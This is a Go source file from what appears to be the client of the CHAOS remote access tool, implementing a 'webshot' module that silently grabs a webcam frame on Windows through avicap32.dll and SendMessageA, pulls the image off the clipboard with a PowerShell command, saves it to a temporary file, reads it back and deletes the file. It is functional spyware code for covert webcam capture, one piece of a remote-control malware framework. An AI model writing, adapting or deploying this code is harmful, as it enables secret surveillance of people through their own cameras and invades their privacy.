package webshot

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"os/exec"
	"syscall"
	"unsafe"
	"reflect"

	"github.com/justadoll/CHAOS/client/app/services"
)

type WebshotService struct{}

func NewScreenshotService() services.Webshot {
	return &WebshotService{}
}

func (ws WebshotService) TakeWebShot() ([]byte, error) {
	clip := CaptureWebcam()
	fmt.Println("clip type:", reflect.TypeOf(clip)) // 
	
	buf := new(bytes.Buffer)
	buf.ReadFrom(clip)
	buf_bytes := buf.Bytes()
	fmt.Println("buf_bytes:", buf_bytes) // bytes
	fmt.Println("buf_bytes type:", reflect.TypeOf(buf_bytes)) // []uint8
	// return buf.Bytes(), nil
	return buf_bytes, nil
}

func CaptureWebcam() (io.Reader) {
	var (
		avicap32   = syscall.NewLazyDLL("avicap32.dll")
		proccapCreateCaptureWindowA  = avicap32.NewProc("capCreateCaptureWindowA")
		
		user32  = syscall.NewLazyDLL("user32.dll")
		procSendMessageA = user32.NewProc("SendMessageA")
	)
	
	var name = "WebcamCapture"
	handle, _, _ := proccapCreateCaptureWindowA.Call(uintptr(unsafe.Pointer(&name)), 0, 0, 0, 320, 240, 0, 0)
	procSendMessageA.Call(handle, 0x40A, 0, 0) //WM_CAP_DRIVER_CONNECT
	procSendMessageA.Call(handle, 0x432, 30, 0) //WM_CAP_SET_PREVIEW
	procSendMessageA.Call(handle, 0x43C, 0, 0) //WM_CAP_GRAB_FRAME
	procSendMessageA.Call(handle, 0x41E, 0, 0) //WM_CAP_EDIT_COPY
	procSendMessageA.Call(handle, 0x40B, 0, 0) //WM_CAP_DRIVER_DISCONNECT
	

	clip, err := readClipboard()
	if err != nil {
	fmt.Println(err)
		return nil
	}
	return clip

}

func readClipboard() (io.Reader, error) {
	f, err := ioutil.TempFile("", "")
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	f.Close()
	_, err = exec.Command("PowerShell", "-Command", "Add-Type", "-AssemblyName", fmt.Sprintf("System.Windows.Forms;$clip=[Windows.Forms.Clipboard]::GetImage();if ($clip -ne $null) { $clip.Save('%s') };", f.Name())).CombinedOutput()
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	r := new(bytes.Buffer)
	file, err := os.Open(f.Name())
	if err != nil {
		fmt.Println(err)
		return nil, err
	}
	if _, err := io.Copy(r, file); err != nil {
		fmt.Println(err)
		return nil, err
	}
	file.Close()
	os.Remove(f.Name())
	return r, nil
}
